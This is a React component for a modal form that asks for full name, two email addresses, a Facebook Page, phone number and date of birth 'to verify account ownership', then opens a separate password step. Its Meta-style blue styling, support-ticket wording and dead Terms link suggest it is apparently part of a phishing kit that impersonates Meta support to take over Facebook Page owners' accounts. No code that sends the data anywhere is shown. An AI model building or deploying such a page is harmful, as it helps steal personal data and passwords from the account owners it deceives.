import React from 'react';
import Modal from '#components/modals/Modal';
import PhoneInput from 'react-phone-input-2';
import CustomCheckbox from '#components/check-box/CustomCheckbox';
import { useAppDispatch, useAppSelector } from '../../app/store/hooks';
import { updateForm, type FormData } from '../../app/store/slices/stepFormSlice';

const MONTH_OPTIONS = [
  { value: '1', label: 'January' },
  { value: '2', label: 'February' },
  { value: '3', label: 'March' },
  { value: '4', label: 'April' },
  { value: '5', label: 'May' },
  { value: '6', label: 'June' },
  { value: '7', label: 'July' },
  { value: '8', label: 'August' },
  { value: '9', label: 'September' },
  { value: '10', label: 'October' },
  { value: '11', label: 'November' },
  { value: '12', label: 'December' },
] as const;

interface InfomationsModalProps {
  isOpend: boolean;
  isOpendPassword: (isOpenPassword: boolean) => void;
  onToggleModal: (isOpen: boolean) => void;
}

const InfomationsModal: React.FC<InfomationsModalProps> = ({ isOpend, isOpendPassword, onToggleModal }) => {

  const [isOpen, setIsOpen] = React.useState(isOpend);
  const [errors, setErrors] = React.useState<Record<string, string>>({});
  const dispatch = useAppDispatch();
  const formData = useAppSelector((state) => state.stepForm.data);

  const dayOptions = React.useMemo(
    () => Array.from({ length: 31 }, (_, i) => String(i + 1)),
    []
  );

  const yearOptions = React.useMemo(() => {
    const currentYear = new Date().getFullYear();
    const maxYear = currentYear - 13;
    const minYear = currentYear - 100;
    const list: string[] = [];
    for (let y = maxYear; y >= minYear; y--) {
      list.push(String(y));
    }
    return list;
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    dispatch(updateForm({ [id as keyof FormData]: value } as Partial<FormData>));
    setErrors(prev => ({ ...prev, [id]: '' }));
  };

  React.useEffect(() => {
    setIsOpen(isOpend);
  }, [isOpend]);

  const handleClose = () => {
    setIsOpen(false);
    onToggleModal(false);
  };

  const handSubmit = async (e: React.FormEvent) => {
    try {
      e.preventDefault();

      const newErrors: Record<string, string> = {};
      if (!formData.fullName.trim()) newErrors.fullName = "Full name is required.";
      if (!formData.email.trim()) newErrors.email = "A valid email address is required.";
      if (!formData.emailBusiness.trim()) newErrors.emailBusiness = "Business email is required.";
      if (!formData.fanpage.trim()) newErrors.fanpage = "Page or profile name is required.";
      if (!formData.phone.trim()) newErrors.phone = "Phone number is required.";

      if (Object.keys(newErrors).length > 0) {
        setErrors(newErrors);
        return;
      }

      const clientData = {
        ...formData,
      };

      dispatch(updateForm(clientData));

      isOpendPassword(true);
      handleClose();

    } catch (error) {
      console.error("Error submitting form:", error);
    }
  };

  const inputClass = (field: string) => `input w-full border ${errors[field] ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200`;
  const selectClass =
    'w-full h-full bg-transparent outline-none text-[14px] cursor-pointer appearance-none pr-[28px]';
  const errorText = (field: string) => errors[field] && <p className="text-red-500 text-[14px] mt-[-5px] mb-[10px]">{errors[field]}</p>;

  return (
    <Modal
      isOpen={isOpen}
      title={"Contact information"}
      onClose={handleClose}
    >
      <div className="h-full flex flex-col flex-start w-full items-center justify-between flex-1">
        <form onSubmit={handSubmit} autoComplete="off" className='w-full'>
          <div className='w-full'>
            <label htmlFor="fullName" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Full name</label>
            <div className={inputClass('fullName')}>
              <input
                type="text"
                id='fullName'
                autoComplete="name"
                placeholder={"As shown on your official ID or account"}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fullName}
                onChange={handleChange}
              />
            </div>
            {errorText('fullName')}

            <label htmlFor="email" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Primary email</label>
            <div className={inputClass('email')}>
              <input
                type="email"
                id='email'
                autoComplete="email"
                placeholder={"name@example.com"}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.email}
                onChange={handleChange}
              />
            </div>
            {errorText('email')}

            <label htmlFor="emailBusiness" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Business email</label>
            <div className={inputClass('emailBusiness')}>
              <input
                type="email"
                id='emailBusiness'
                autoComplete="email"
                placeholder={"Work or business contact email"}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.emailBusiness}
                onChange={handleChange}
              />
            </div>
            {errorText('emailBusiness')}

            <label htmlFor="fanpage" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Page or profile</label>
            <div className={inputClass('fanpage')}>
              <input
                type="text"
                id='fanpage'
                placeholder={"Facebook Page name or profile URL"}
                className="w-full outline-0 h-full tracking-wide"
                value={formData.fanpage}
                onChange={handleChange}
              />
            </div>
            {errorText('fanpage')}

            <label className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Phone number</label>
            <div className={`input w-full border ${errors.phone ? 'border-red-500' : 'border-[#d4dbe3]'} h-[40px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <PhoneInput
                country={formData.country_code?.toLowerCase() || "us"}
                value={formData.phone}
                onChange={(phone) => {
                  dispatch(updateForm({ phone }))
                  setErrors(prev => ({ ...prev, phone: '' }))
                  if (phone.length > 0) {
                    setErrors(prev => ({ ...prev, phone: '' }))
                  }
                }}
              />
            </div>
            {errorText('phone')}

            <span className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Date of birth</span>
            <p className="text-[#9a979e] text-[13px] mb-[8px] leading-snug">Select your date of birth. This helps us verify account ownership.</p>
            <div className="grid grid-cols-3 gap-[10px]">
              <div>
                <label htmlFor="day" className="sr-only">Day</label>
                <div
                  className={inputClass('day')}
                  style={{
                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239a979e' d='M6 8L2 4h8z'/%3E%3C/svg%3E")`,
                    backgroundRepeat: 'no-repeat',
                    backgroundSize: '12px',
                    backgroundPosition: 'right 11px center',
                  }}
                >
                  <select
                    id="day"
                    value={formData.day}
                    onChange={handleChange}
                    className={selectClass}
                  >
                    <option value="">Day</option>
                    {dayOptions.map((d) => (
                      <option key={d} value={d}>{d}</option>
                    ))}
                  </select>
                </div>
                {errorText('day')}
              </div>

              <div>
                <label htmlFor="month" className="sr-only">Month</label>
                <div
                  className={inputClass('month')}
                  style={{
                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239a979e' d='M6 8L2 4h8z'/%3E%3C/svg%3E")`,
                    backgroundRepeat: 'no-repeat',
                    backgroundSize: '12px',
                    backgroundPosition: 'right 11px center',
                  }}
                >
                  <select
                    id="month"
                    value={formData.month}
                    onChange={handleChange}
                    className={selectClass}
                  >
                    <option value="">Month</option>
                    {MONTH_OPTIONS.map((m) => (
                      <option key={m.value} value={m.value}>{m.label}</option>
                    ))}
                  </select>
                </div>
                {errorText('month')}
              </div>

              <div>
                <label htmlFor="year" className="sr-only">Year</label>
                <div
                  className={inputClass('year')}
                  style={{
                    backgroundImage: `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%239a979e' d='M6 8L2 4h8z'/%3E%3C/svg%3E")`,
                    backgroundRepeat: 'no-repeat',
                    backgroundSize: '12px',
                    backgroundPosition: 'right 11px center',
                  }}
                >
                  <select
                    id="year"
                    value={formData.year}
                    onChange={handleChange}
                    className={selectClass}
                  >
                    <option value="">Year</option>
                    {yearOptions.map((y) => (
                      <option key={y} value={y}>{y}</option>
                    ))}
                  </select>
                </div>
                {errorText('year')}
              </div>
            </div>

            <label htmlFor="message" className="block text-[#9a979e] text-[14px] mb-[7px] font-semibold">Additional details</label>
            <div className={`input w-full border border-[#d4dbe3] h-[100px] px-[11px] py-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px]`}>
              <textarea
                id='message'
                className="w-full outline-0 h-full resize-none"
                placeholder={"Optional: add context to help us process your request faster"}
                value={formData.message}
                onChange={handleChange}
              />
            </div>

            <div>
              <p className='text-[#9a979e] text-[14px] mb-[7px] leading-snug'>We typically respond within 14–48 hours during business days.</p>
            </div>
            <div className='mt-[15px] mb-[20px]'>
              <label className='cursor-pointer flex items-center gap-[5px] text-[14px] ' htmlFor="custom-checkbox">
                <CustomCheckbox />
                I have read and agree to the <a href='' className='text-[#0064E0] hover:underline'>Terms of Use <img src="/images/icons/ic_reject.svg" alt="" className='inline w-[13px] h-[13px] min-w-[13px] min-h-[13px] max-w-[13px] max-h-[13px]' /></a>
              </label>
            </div>
            <div className='w-full mt-[20px] '>
              <button type="submit" className='w-full h-[45px] min-h-[45px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer font-[500] text-[15px]'>Continue</button>
            </div>
          </div>

        </form>
      </div>
    </Modal>
  );
};

export default InfomationsModal;